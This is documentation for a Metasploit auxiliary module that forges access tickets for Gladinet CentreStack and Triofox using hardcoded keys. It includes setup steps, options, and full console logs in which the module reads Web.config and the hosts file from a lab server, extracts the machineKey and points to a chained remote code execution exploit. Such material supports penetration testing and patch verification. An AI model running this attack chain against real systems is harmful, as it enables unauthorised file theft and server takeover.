## Vulnerable Application

An insecure cryptography vulnerability exists in Gladinet CentreStack and Triofox that allows an
unauthenticated attacker to forge access tickets for the `/storage/filesvr.dn` endpoint. The vulnerability exists because
the application uses hardcoded cryptographic keys in GladCtrl64.dll to encrypt/decrypt access tickets.

The access ticket is an encrypted string that contains:
- Filepath: The absolute path to the file on the server
- Username: Empty (Application Pool Identity will be used)
- Password: Empty
- Timestamp: Creation time (set to excessive year to never expire)

Because the cryptographic keys are hardcoded and identical across all vulnerable installations, an attacker can forge
tickets to read arbitrary files from the server's file system, including sensitive configuration files like `Web.config`
which contains the `machineKey` used for ViewState deserialization attacks.

* Gladinet CentreStack versions up to 16.12.10420.56791 are vulnerable.
* Gladinet Triofox versions up to 16.12.10420.56791 are vulnerable.

The following releases were tested.

**Gladinet CentreStack:**
* Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019

## Installation steps to install Gladinet CentreStack or Triofox Enterprise Editions

* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download an evaluation Windows Server iso image (2016, 2019 or 2022) and install it as a VM on your virtualization engine.
* Note: Google is your best friend on how to do this ;-)
* Download the [Gladinet CentreStack gui installer](https://www.centrestack.com/p/gce_latest_release.html) or...
* Download the [Gladinet Triofox gui installer](https://access.triofox.com/releases_history/).
* Note: For Triofox, you will need a free trail account to reach the installer page.
* Run the gui installer on your Windows VM.
* Reboot your VM and you should be able to access the application via `https://your_ip/portal/loginpage.aspx`.

You are now ready to test the module.

## Verification Steps

- [ ] Start `msfconsole`
- [ ] `use auxiliary/gather/gladinet_storage_access_ticket_forge`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>` (default: 80)
- [ ] `set filepath <file-to-read>` (default: `C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config`)
- [ ] `run`
- [ ] The module should forge an access ticket and read the specified file

## Options

### FILEPATH

The file path to read on the target. Default: `C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config`

### SYSKEY

SysKey (32 bytes) in hex format. Default is the hardcoded key extracted from GladCtrl64.dll.

### SYSKEY1

SysKey1 (16 bytes) in hex format. Default is the hardcoded key extracted from GladCtrl64.dll.

## Scenarios

### Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019 - Reading Web.config

```msf
msf6 > use auxiliary/gather/gladinet_storage_access_ticket_forge
msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set rhosts 192.168.1.21
rhosts => 192.168.1.21
msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set rport 80
rport => 80
msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set ssl false
ssl => false
msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set filepath "C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config"
filepath => C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > run
[*] Running module against 192.168.1.21
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Access ticket forge vulnerability confirmed (Build 16.1.10296.56315)
[*] Forging access ticket for file: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
[+] Forged access ticket: vghpI7EToZUDIZDdprSubL3mTZ2:aCLI:8Zra5AOPvX4TEEXlZiueqNysfRx7Dsded1YxC8kWXuG29DNFQLVnqqQUoOMcLs8M|Xh6Bqb4goJej1Y0Ay:jPozhW6:ZemN

[*] Sending request to /storage/filesvr.dn
[+] Successfully read file: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config

<?xml version="1.0" encoding="UTF-8"?>
<!--
    Note: As an alternative to hand editing this file you can use the 
    web admin tool to configure settings for your application. Use
    the Website->Asp.Net Configuration option in Visual Studio.
    A full list of settings and comments can be found in 
    machine.config.comments usually located in 
    \Windows\Microsoft.Net\Framework\v2.x\Config 
-->
<configuration>
   <system.web>
		<compilation debug="false" />
        <machineKey decryption="AES" decryptionKey="B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9" validationKey="5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16" />
		<customErrors mode="RemoteOnly" defaultRedirect="defaulterrorpage.htm">
			<error statusCode="404" redirect="defaulterrorpage.htm" />
			<error statusCode="403" redirect="defaulterrorpage.htm" />
			<error statusCode="401" redirect="defaulterrorpage.htm" />
			<error statusCode="500" redirect="defaulterrorpage.htm" />
		</customErrors>
		<trust level="Full" />
		<identity impersonate="false" />
   </system.web>

  <system.serviceModel>
    <bindings>
      <wsHttpBinding>
        <binding name="WSHttpBinding_IHostsMgr" closeTimeout="00:01:00" openTimeout="00:01:00" receiveTimeout="00:10:00" sendTimeout="00:01:00" bypassProxyOnLocal="false" transactionFlow="false" hostNameComparisonMode="StrongWildcard" maxBufferPoolSize="524288" maxReceivedMessageSize="65536" messageEncoding="Text" textEncoding="utf-8" useDefaultWebProxy="true" allowCookies="false">
          <readerQuotas maxDepth="32" maxStringContentLength="8192" maxArrayLength="16384" maxBytesPerRead="4096" maxNameTableCharCount="16384" />
          <reliableSession ordered="true" inactivityTimeout="00:10:00" enabled="false" />
          <security mode="Message">
            <transport clientCredentialType="Windows" proxyCredentialType="None" realm="" />
            <message clientCredentialType="Windows" negotiateServiceCredential="true" algorithmSuite="Default" establishSecurityContext="true" />
          </security>
        </binding>
      </wsHttpBinding>
    </bindings>
    <client>
      <endpoint address="http://localhost:8732/GladinetCloudMonitor/HostsMgr.svc/" binding="wsHttpBinding" bindingConfiguration="WSHttpBinding_IHostsMgr" contract="IHostsMgr" name="WSHttpBinding_IHostsMgr">
        <identity>
          <dns value="localhost" />
        </identity>
      </endpoint>
    </client>
  </system.serviceModel>
  
  <appSettings file="branding.config">
	
	<add key="Sysnumber" value="4855426994914051" />
	<add key="EmailPwd" value="" />
    <add key="InstalledApp" value="true" />
	<add key="UseDerivedSysNumber" value="true" />
	<add key="CSBizEdition" value="true" />
	<add key="CanTrace" value="false" />

    <!--
      Paypal
    -->
    <add key="User" value="" />
    <add key="Password" value="" />
    <add key="Partner" value="" />
    <add key="Vendor" value="" />
    <add key="PackageApplication" value="Cluster" />
    <add key="PAYFLOW_HOST" value="payflowpro.paypal.com" />
    <add key="PAYFLOW_HOST_Test" value="pilot-payflowpro.paypal.com" />

    <!--
      StorageList
    -->
    <add key="GladinetStorage" value="http://localhost:8080/gladstor/g.svc/" />
    <add key="GladinetStorageOpenStack" value="http://localhost:8080/gladopens/g.svc/" />
    <add key="BYOC_S3_SetupPage" value="StorageConfig/AmazonS3.aspx" />
    <add key="BYOC_S3_EndPoint" value="http://localhost:8080/gladstor/g.svc/" />
    <add key="BYOC_GOVCLOUD_SetupPage" value="StorageConfig/AmazonS3GovCloud.aspx" />
    <add key="BYOC_GOVCLOUD_EndPoint" value="http://localhost:8080/gladstor/g.svc/" />
    <add key="BYOC_GSD_SetupPage" value="StorageConfig/Google.aspx" />
    <add key="BYOC_GSD_EndPoint" value="http://localhost:8080/googlestor/g.svc/" />
    <add key="BYOC_AZURE_SetupPage" value="StorageConfig/Azure.aspx" />
    <add key="BYOC_AZURE_EndPoint" value="http://localhost:8080/gladazure/g.svc/" />
    <add key="BYOC_HPCLOUD2_SetupPage" value="StorageConfig/HPCloud.aspx" />
    <add key="BYOC_HPCLOUD2_EndPoint" value="http://localhost:8080/gladhp/g.svc/" />
    <add key="BYOC_OPENSTACK_EndPoint" value="http://localhost:8080/gladopens/g.svc/" />
    <add key="BYOC_S3CLONE_SetupPage" value="StorageConfig/AmazonS3Others.aspx" />
    <add key="BYOC_S3ClONE_EndPoint" value="http://localhost:8080/glads3clone/g.svc/" />
    <add key="BYOC_OPENSTACK_RACK_US_SetupPage" value="StorageConfig/OpenStack.aspx?f=RACK_US" />
    <add key="BYOC_OPENSTACK_RACK_UK_SetupPage" value="StorageConfig/OpenStack.aspx?f=RACK_UK" />
    <add key="BYOC_OPENSTACK_INAP_SetupPage" value="StorageConfig/OpenStack.aspx?f=INAP" />
    <add key="BYOC_OPENSTACK_HPC_SetupPage" value="StorageConfig/OpenStack.aspx?f=HP" />
    <add key="ShowHPCloudxxx" value="Clear this string if HP Cloud is still in private beta/NDA" />
    <add key="BYOC_OPENSTACK_SetupPage" value="StorageConfig/OpenStack.aspx" />
    <add key="BYOC_ATMOS2_SetupPage" value="StorageConfig/Atmos2.aspx" />
    <add key="BYOC_ATMOS2_EndPoint" value="http://localhost:8080/gladatmos2/g.svc/" />
    <add key="BYOC_NIRVANIX_SetupPage" value="StorageConfig/Nirvanix.aspx" />
    <add key="BYOC_NIRVANIX_EndPoint" value="http://localhost:8080/gladnirvanix/g.svc/" />
    <add key="BYOC_IBMSMARTCLOUD_SetupPage" value="StorageConfig/Nirvanix.aspx?f=IBM" />
    <add key="BYOC_IBMSMARTCLOUD_EndPoint" value="http://localhost:8080/gladnirvanix/g.svc/" />
    <add key="BYOC_KEYSTONE_SetupPage" value="StorageConfig/KeyStone.aspx" />

	<add key="BYOC_WEBDAV_SetupPage" value="StorageConfig/WebDav.aspx" />
    <add key="BYOC_WEBDAV_EndPoint" value="http://localhost:8080/gladwebdav/g.svc/" />
	
    <!--
      Glad Stor
    -->
    <add key="AccessKey" value="" />
    <add key="Secret" value="" />
    <add key="Bucket" value="" />
    <add key="SESAccessKey" value="" />
    <add key="SESSecret" value="" />

    <!--
     Glad Stor for GCS
    -->
    <add key="GCSAccessKey" value="" />
    <add key="GCSSecret" value="" />
    <add key="GCSBucket" value="" />

    <!-- Portal settings -->
    <add key="DisableSSL" value="Remove this if glad02 becomes glad01" />

    <!-- Quota -->
    <add key="ScanFile" value="true" />
    <add key="ScanSize" value="512000" />

    <!--
      Email service setup
	SMTPUse3rdParty - true to use 3rd party setting, false to use amazon SES
	SMTPSSL3rdParty - true to use SSL , false use plain SMTP, mostly plain will work 
	SMTPServer3rdParty - host DNS name
	SMTPPort3rdParty - default is 25, however 25 may be abused and blocked by ISP. Jango provided 2525
	SMTPAuthUser3rdParty - the authenticated user to authenticate SMTP 
	SMTPUser3rdParty - sender's email , eventually change to something like custservice@xxxx.com
	SMTPPassword3rdParty - password for the authenticated user.
    <add key="SMTPUse3rdParty" value="" />
    <add key="SMTPSSL3rdParty" value="" />
    <add key="SMTPServer3rdParty" value="" />
    <add key="SMTPPort3rdParty" value="" />
    <add key="SMTPAuthUser3rdParty" value="" />
    <add key="SMTPUser3rdParty" value="" />
    <add key="SMTPPassword3rdParty" value="" />
    -->

	<add key="Search_EngineRoot" value="c:\SearchRoot" />
	<add key="CheckFolderPerm" value="true" />
	
	<add key="NoMMCForClusterAdmin" value="true" />

  </appSettings>

  <system.webServer>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="4294967295"></requestLimits>
      </requestFiltering>
    </security>
        <httpRedirect enabled="true" exactDestination="true" httpResponseStatus="Found">
            <add wildcard="*/" destination="/portal/loginpage.aspx" />
            <add wildcard="/files" destination="/portal/files$Q" />
            <add wildcard="/portal" destination="/portal/files" />
            <add wildcard="/portal/" destination="/portal/files" />
            <add wildcard="/clustermgrconsole" destination="/management/clustermgrconsole" />
            <add wildcard="/tenantconsole" destination="/management/tenantconsole" />
            <add wildcard="/tenantbackupconsole" destination="/management/tenantbackupconsole" />
            <add wildcard="/clusterbackupconsole" destination="/management/clusterbackupconsole" />
        </httpRedirect>
  </system.webServer>
  
</configuration>

[+] File saved to: /home/chocapikk/.msf4/loot/20251212190240_default_192.168.1.21_gladinet.file_853353.txt
[+] Access ticket saved to: /home/chocapikk/.msf4/loot/20251212190240_default_192.168.1.21_gladinet.ticket_570543.txt
[+] Extracted machineKey from Web.config
MachineKey: 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16

[+] For RCE: use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
[*] Set the MACHINEKEY option in the exploit module:
use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
set MACHINEKEY 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
[+] MachineKey saved to: /home/chocapikk/.msf4/loot/20251212190240_default_192.168.1.21_gladinet.machine_785010.txt
[*] Auxiliary module execution completed
```

### Reading an arbitrary file

```msf
msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set filepath "C:\Windows\System32\drivers\etc\hosts"
filepath => C:\Windows\System32\drivers\etc\hosts
msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > run
[*] Running module against 192.168.1.21
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Access ticket forge vulnerability confirmed (Build 16.1.10296.56315)
[*] Forging access ticket for file: C:\Windows\System32\drivers\etc\hosts
[+] Forged access ticket: vghpI7EToZUDIZDdprSubL3mTZ2:aCLI:8Zra5AOPvX4TEEXlZiueqNysfRx7Dsd3P5l6eiYyDiG8Lvm0o41m:ZDplEYEsO5ksZajiXcsumkDyUgpV5VLxL|372varAu

[*] Sending request to /storage/filesvr.dn
[+] Successfully read file: C:\Windows\System32\drivers\etc\hosts

    # Copyright (c) 1993-2009 Microsoft Corp.
    #
    # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
    #
    # This file contains the mappings of IP addresses to host names. Each
    # entry should be kept on an individual line. The IP address should
    # be placed in the first column followed by the corresponding host name.
    # The IP address and the host name should be separated by at least one
    # space.
    #
    # Additionally, comments (such as these) may be inserted on individual
    # lines or following the machine name denoted by a '#' symbol.
    #
    # For example:
    #
    #      102.54.94.97     rhino.acme.com          # source server
    #       38.25.63.10     x.acme.com              # x client host

    # localhost name resolution is handled within DNS itself.
    #	127.0.0.1       localhost
    #	::1             localhost


[+] File saved to: /home/chocapikk/.msf4/loot/20251212180728_default_192.168.1.21_gladinet.file_hosts.txt
[+] Access ticket saved to: /home/chocapikk/.msf4/loot/20251212180728_default_192.168.1.21_gladinet.ticket_688212.txt
[*] Auxiliary module execution completed
```

## Limitations

The forged access ticket uses hardcoded cryptographic keys that are identical across all vulnerable installations. The
module generates a random timestamp with an excessive year (100+ years in the future) to ensure the ticket never expires.

Some files may not be readable due to:
* File system permissions
* IIS request filtering
* File locking by the application
* Network path restrictions
